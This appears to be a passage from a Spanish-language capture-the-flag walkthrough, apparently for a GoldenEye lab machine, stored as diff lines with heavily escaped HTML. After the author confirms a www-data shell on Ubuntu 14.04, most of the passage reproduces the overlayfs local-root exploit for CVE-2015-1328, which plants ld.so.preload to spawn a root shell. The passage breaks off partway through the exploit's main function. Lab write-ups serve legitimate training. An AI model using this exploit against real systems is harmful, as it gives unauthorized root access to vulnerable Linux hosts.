+For programming I highly prefer the Alternative to GCC, which FreeBSD uses. It's more verbose when compiling, throwing warnings and such - this can easily be turned off with a proper flag. I've replaced GCC with this throughout the GolenEye systems.
+&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;
+Boris, no arguing about this, GCC has been removed and that's final! 
+&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;
+Also why have you been chatting with Xenia in private Boris? She's a new contractor that you've never met before? Are you sure you've never worked together...?
+&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;
+-Admin 
+&amp;lt;/p&amp;gt;
+&amp;lt;hr&amp;gt;
+&amp;lt;p style=&quot;&lt;/span&gt;color:purple&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
+Janus was here
+&amp;lt;/p&amp;gt;
+&amp;lt;hr&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+www-data@ubuntu:/var/www/html&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Aqui nos dice que GCC ha sido eliminado del sistema y que se ocupa algo alternativo sobre FreeBSD (en este caso CC). Ahora vamos a ver el tipo de máquina que nos enfrentamos.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+Linux ubuntu 3.13.0-32-generic &lt;span class=&quot;c&quot;&gt;#57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
+www-data@ubuntu:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;lsb_release &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+No LSB modules are available.
+Distributor ID: Ubuntu
+Description:    Ubuntu 14.04.1 LTS
+Release:        14.04
+Codename:       trusty
+www-data@ubuntu:/var/www/html&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con la versión del sistema operativo y buscando un poco, encontramos un programa en &lt;strong&gt;C&lt;/strong&gt; que nos puede ayudar a escalar privilegios &lt;a href=&quot;https://github.com/offensive-security/exploitdb/blob/master/exploits/linux/local/37292.c&quot;&gt;37292.c&lt;/a&gt; y como la máquina no tiene gcc para compilar, en el mismo programa cambiaremos &lt;strong&gt;gcc&lt;/strong&gt; por &lt;strong&gt;cc&lt;/strong&gt; y lo compilaremos en la máquina haciendo uso de un directorio donde tengas privilegios de escritura y ejecución &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/shm&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/*
+
+# Exploit Title: ofs.c - overlayfs local root in ubuntu
+
+# Date: 2015-06-15
+
+# Exploit Author: rebel
+
+# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)
+
+# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04
+
+# CVE : CVE-2015-1328 (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)
+
+*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
+
+CVE-2015-1328 / ofs.c
+
+overlayfs incorrect permission handling + FS_USERNS_MOUNT
+
+user@ubuntu-server-1504:~$ uname -a
+
+Linux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+
+user@ubuntu-server-1504:~$ gcc ofs.c -o ofs
+
+user@ubuntu-server-1504:~$ id
+
+uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)
+
+user@ubuntu-server-1504:~$ ./ofs
+
+spawning threads
+
+mount #1
+
+mount #2
+
+child threads done
+
+/etc/ld.so.preload created
+
+creating shared library
+
+# id
+
+uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)
+
+greets to beist &amp;amp; kaliman
+
+2015-05-24
+
+%rebel%
+
+*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
+
+*/&lt;/span&gt;
+
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;sched.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;sys/stat.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;sys/types.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;sys/mount.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;sched.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;sys/stat.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;sys/types.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;sys/mount.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;sys/types.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;signal.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;fcntl.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;string.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;linux/sched.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#define LIB &quot;#include &amp;lt;unistd.h&amp;gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \&quot;getuid\&quot;);\nreadlink(\&quot;/proc/self/exe\&quot;, (char *) &amp;amp;path, 128);\nif(geteuid() == 0 &amp;amp;&amp;amp; !strcmp(path, \&quot;/bin/su\&quot;)) {\nunlink(\&quot;/etc/ld.so.preload\&quot;);unlink(\&quot;/tmp/ofs-lib.so\&quot;);\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\&quot;/bin/sh\&quot;, \&quot;sh\&quot;, \&quot;-i\&quot;, NULL, NULL);\n}\n return _real_getuid();\n}\n&quot;
+&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;child_stack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
+
+&lt;span class=&quot;nf&quot;&gt;child_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rm -rf /tmp/ns_sploit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;mkdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/ns_sploit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;0777&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;mkdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/ns_sploit/work&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;0777&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;mkdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/ns_sploit/upper&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;0777&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;mkdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/ns_sploit/o&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;0777&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mount #1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;overlay&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/tmp/ns_sploit/o&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;overlayfs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MS_MGC_VAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// workdir= and &quot;overlay&quot; is needed on newer kernels, also can't use /proc as lower&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;overlay&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/tmp/ns_sploit/o&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;overlay&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MS_MGC_VAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;no FS_USERNS_MOUNT for overlayfs on this kernel&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;.access&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;chmod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/ns_sploit/work/work&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;0777&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ns_last_pid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;chdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/ns_sploit/o&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;rename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ld.so.preload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;chdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;umount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/ns_sploit/o&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mount #2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;overlay&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/tmp/ns_sploit/o&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;overlayfs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MS_MGC_VAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;overlay&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/tmp/ns_sploit/o&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;overlay&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MS_MGC_VAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;chmod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/ns_sploit/work/work&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;0777&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;chmod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/ns_sploit/o/ld.so.preload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;0777&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;umount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/ns_sploit/o&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
+
+&lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;pid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clone_flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CLONE_NEWNS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SIGCHLD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;spawning threads&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wrapper&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fork&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unshare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CLONE_NEWUSER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;failed to create new user namespace&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;init&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fork&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;pid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;clone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;child_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;child_stack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clone_flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
